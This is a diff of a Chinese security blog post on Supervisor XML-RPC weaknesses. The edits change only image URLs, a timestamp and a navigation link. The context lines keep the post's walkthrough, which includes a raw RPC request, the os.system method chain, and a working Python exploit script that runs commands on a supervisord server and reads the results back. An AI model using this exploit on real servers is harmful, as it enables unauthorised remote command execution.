@@ -291,15 +291,15 @@
 <li>Supervisor 未配置密码或使用弱密码</li>
 </ul>
 <p><em>漏洞利用：</em><br>下面举个例子：在这里利用python使用RPC协议给supervisord发一个请求，来看下RPC协议的结构和params、method分别是什么。<br>抓取的流量如下图：<br><figure class="image-box">
-                <a rel=Supervisor服务脆弱性 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190525224756.png" target="_blank" title="WeiyiGeek.wirshaek" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190525224756.png" alt="WeiyiGeek.wirshaek" title="" class=""></a>
+                <a rel=Supervisor服务脆弱性 href="https://img.weiyigeek.top/2019/20190525224756.png" target="_blank" title="WeiyiGeek.wirshaek" data-fancybox="images"><img src="https://img.weiyigeek.top/2019/20190525224756.png" alt="WeiyiGeek.wirshaek" title="" class=""></a>
                 <p>WeiyiGeek.wirshaek</p>
             </figure><br>以此类推，最终的os会是链状结构最后一个方法，然后传入params值，被执行所以如果想攻击利用成功，必须找到一个调用链方法例：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisor.supervisord.options.warnings.linecache.os.system</span><br></pre></td></tr></table></figure></p>
 <p>采用burpsuite进行重放：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /RPC2 HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 275</span><br><span class="line"></span><br><span class="line">&lt;?xml version=<span class="string">"1.0"</span>?&gt;</span><br><span class="line">&lt;methodCall&gt;</span><br><span class="line">&lt;methodName&gt;supervisor.supervisord.options.warnings.linecache.os.system&lt;/methodName&gt;</span><br><span class="line">&lt;params&gt;</span><br><span class="line">&lt;param&gt;</span><br><span class="line">&lt;string&gt;touch /tmp/success&lt;/string&gt;</span><br><span class="line">&lt;/param&gt;</span><br><span class="line">&lt;/params&gt;</span><br><span class="line">&lt;/methodCall&gt;</span><br></pre></td></tr></table></figure><br><figure class="image-box">
-                <a rel=Supervisor服务脆弱性 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190525224846.png" target="_blank" title="WeiyiGeek.burpsuite" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190525224846.png" alt="WeiyiGeek.burpsuite" title="" class=""></a>
+                <a rel=Supervisor服务脆弱性 href="https://img.weiyigeek.top/2019/20190525224846.png" target="_blank" title="WeiyiGeek.burpsuite" data-fancybox="images"><img src="https://img.weiyigeek.top/2019/20190525224846.png" alt="WeiyiGeek.burpsuite" title="" class=""></a>
                 <p>WeiyiGeek.burpsuite</p>
             </figure></p>
 <p>Shell反弹：<br><figure class="image-box">
-                <a rel=Supervisor服务脆弱性 href="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190525225305.png" target="_blank" title="WeiyiGeek.recv" data-fancybox="images"><img src="https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/20190525225305.png" alt="WeiyiGeek.recv" title="" class=""></a>
+                <a rel=Supervisor服务脆弱性 href="https://img.weiyigeek.top/2019/20190525225305.png" target="_blank" title="WeiyiGeek.recv" data-fancybox="images"><img src="https://img.weiyigeek.top/2019/20190525225305.png" alt="WeiyiGeek.recv" title="" class=""></a>
                 <p>WeiyiGeek.recv</p>
             </figure></p>
 <p><em>补充思路：</em><br>在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#useage：exp.py http://user:pass@127.0.0.1:9001 whoami</span></span><br><span class="line">import xmlrpc.client</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">target = sys.argv[1]</span><br><span class="line"><span class="built_in">command</span> = sys.argv[2]</span><br><span class="line"></span><br><span class="line">with xmlrpc.client.ServerProxy(target) as proxy:</span><br><span class="line">    old = getattr(proxy, <span class="string">'supervisor.readLog'</span>)(0,0)</span><br><span class="line">    logfile = getattr(proxy, <span class="string">'supervisor.supervisord.options.logfile.strip'</span>)()</span><br><span class="line">    getattr(proxy, <span class="string">'supervisor.supervisord.options.warnings.linecache.os.system'</span>)(<span class="string">'&#123;&#125; | tee -a &#123;&#125;'</span>.format(<span class="built_in">command</span>, logfile))</span><br><span class="line">    result = getattr(proxy, <span class="string">'supervisor.readLog'</span>)(0,0)</span><br><span class="line">    <span class="built_in">print</span>(result[len(old):])</span><br></pre></td></tr></table></figure></p>
@@ -348,7 +348,7 @@
       
         
 <span class="post-time">
-    最后更新时间：<time datetime="2022-03-29T05:39:05.027Z" itemprop="dateUpdated">2022-03-29 13:39:05</time>
+    最后更新时间：<time datetime="2023-01-31T02:29:10.673Z" itemprop="dateUpdated">2023-01-31 10:29:10</time>
 </span><br>
 
 
@@ -440,9 +440,9 @@
 <nav class="post-nav flex-row flex-justify-between">
   
     <div class="prev">
-      <a href="/2019/5-27-206.html" id="post-prev" class="post-nav-link">
+      <a href="/2019/5-27-207.html" id="post-prev" class="post-nav-link">
         <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">Linux磁盘管理之LVM快速入门配置</h4>
+        <h4 class="title">软Raid基础实现流程</h4>
       </a>
     </div>
   
